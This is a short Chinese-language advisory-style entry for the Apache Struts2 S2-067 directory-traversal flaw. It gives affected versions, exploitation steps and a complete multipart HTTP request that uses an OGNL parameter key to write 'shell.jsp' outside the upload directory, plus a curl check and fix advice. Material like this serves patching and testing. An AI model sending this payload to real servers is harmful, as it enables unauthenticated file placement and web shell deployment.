## 漏洞描述

S2-067 是 S2-066 漏洞的变种，产生于对 S2-066 的不完全修复。在 Struts2 中，所有参数在传递时，参数的键名都会进行 OGNL 表达式的计算。S2-067 利用这个表达式计算机制，再次覆盖上传文件时的文件名，最终导致目录穿越问题。

## 影响版本

- Apache Struts 2.0.0 - 2.5.33

## 前置条件

- 无需认证
- 目标应用有文件上传功能

## 利用步骤

1. 上传文件时在参数键名中使用 OGNL 表达式
2. 利用参数键名的 OGNL 计算覆盖文件名
3. 上传文件到任意目录

## Payload

```http
POST /index.action HTTP/1.1
Host: target:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl6ZFZPznNSPZOFJF

------WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Disposition: form-data; name="file"; filename="shell.jsp"

<%
  out.println("hello world");
%>
------WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Disposition: form-data; name="top.fileFileName"

../shell.jsp
------WebKitFormBoundaryl6ZFZPznNSPZOFJF--
```

## 验证方法

```bash
# 检查 shell.jsp 是否上传到 webapps/ROOT 目录
curl -s http://target:8080/shell.jsp
```

## 修复建议

1. 升级 Apache Struts 至 2.5.34+
2. 对上传文件名进行严格验证
3. 禁止参数键名中的 OGNL 表达式
